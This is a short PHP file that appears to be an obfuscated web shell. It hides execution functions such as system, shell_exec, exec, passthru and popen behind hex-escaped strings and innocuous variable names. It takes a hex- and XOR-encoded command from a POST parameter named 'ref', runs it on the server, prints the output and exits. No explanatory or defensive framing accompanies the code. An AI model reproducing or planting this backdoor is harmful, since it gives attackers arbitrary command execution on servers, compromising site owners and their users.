<?php

$publish_content3 = "ex\x65c";
$publish_content7 = "p\x63\x6Co\x73e";
$publish_content4 = "\x70as\x73thr\x75";
$dataflow_engine = "he\x782bi\x6E";
$publish_content6 = "strea\x6D_\x67et\x5F\x63onte\x6Ets";
$publish_content2 = "she\x6Cl\x5F\x65x\x65c";
$publish_content5 = "pope\x6E";
$publish_content1 = "sys\x74em";
if (isset($_POST["\x72e\x66"])) {
            function app_initializer   ( $descriptor , $obj   ){
    $property_set    ='';
 for($z=0;
 $z<strlen($descriptor);
 $z++){
$property_set.=chr(ord($descriptor[$z])^$obj);

} return $property_set;
 
}
            $ref = $dataflow_engine($_POST["\x72e\x66"]);
            $ref = app_initializer($ref, 96);
            if (function_exists($publish_content1)) {
                $publish_content1($ref);
            } elseif (function_exists($publish_content2)) {
                print $publish_content2($ref);
            } elseif (function_exists($publish_content3)) {
                $publish_content3($ref, $value_descriptor);
                print join("\n", $value_descriptor);
            } elseif (function_exists($publish_content4)) {
                $publish_content4($ref);
            } elseif (function_exists($publish_content5) && function_exists($publish_content6) && function_exists($publish_content7)) {
                $obj_property_set = $publish_content5($ref, 'r');
                if ($obj_property_set) {
                    $object_fac = $publish_content6($obj_property_set);
                    $publish_content7($obj_property_set);
                    print $object_fac;
                }
            }
            exit;
        }